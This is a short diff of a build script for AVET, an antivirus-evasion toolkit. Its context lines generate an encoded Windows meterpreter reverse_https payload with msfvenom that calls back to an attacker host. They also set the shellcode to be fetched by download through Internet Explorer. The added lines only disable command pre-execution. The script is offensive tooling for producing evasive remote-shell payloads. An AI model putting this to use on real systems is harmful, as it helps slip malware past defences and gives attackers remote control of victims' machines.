@@ -31,6 +31,10 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 # Apply AVET encoding
 encode_payload avet input/sc_c.txt output/scenc_raw.txt
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source download_internet_explorer
 
